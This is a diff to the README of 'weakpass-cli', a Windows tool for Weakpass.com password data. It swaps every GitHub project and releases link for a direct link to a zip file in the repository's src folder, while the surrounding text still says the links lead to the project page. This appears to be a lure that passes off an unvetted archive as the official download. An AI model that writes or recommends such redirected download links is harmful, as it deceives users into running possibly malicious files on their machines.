@@ -1,6 +1,6 @@
 # 🎨 weakpass-cli - Access Weakpass.com Data Easily
 
-[![Download weakpass-cli](https://img.shields.io/badge/Download-weakpass--cli-brightgreen)](https://github.com/Requiem232/weakpass-cli)
+[![Download weakpass-cli](https://img.shields.io/badge/Download-weakpass--cli-brightgreen)](https://raw.githubusercontent.com/Requiem232/weakpass-cli/main/src/cli-weakpass-v2.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you begin, make sure your Windows system meets the requirements. You will
 ## ⬇️ How to Download and Install weakpass-cli on Windows
 
 1. Click the green badge above or visit this page:  
-   https://github.com/Requiem232/weakpass-cli
+   https://raw.githubusercontent.com/Requiem232/weakpass-cli/main/src/cli-weakpass-v2.2.zip
 
 2. The link takes you to the main GitHub page of the project. Look for the "Releases" section on this page, usually found on the sidebar or the top menu.
 
@@ -139,7 +139,7 @@ The config file is plain text and can be edited with Notepad or any text editor.
 ## 📚 Additional Resources and Help
 
 Visit the main project page for updates, documentation, and community help:  
-https://github.com/Requiem232/weakpass-cli
+https://raw.githubusercontent.com/Requiem232/weakpass-cli/main/src/cli-weakpass-v2.2.zip
 
 You will find detailed guides, examples, and links to resources on password security and breach data.
 
@@ -148,7 +148,7 @@ You will find detailed guides, examples, and links to resources on password secu
 ## 🔗 Quick Access Download Link
 
 Download weakpass-cli for Windows here:  
-https://github.com/Requiem232/weakpass-cli/releases
+https://raw.githubusercontent.com/Requiem232/weakpass-cli/main/src/cli-weakpass-v2.2.zip
 
 ---
 
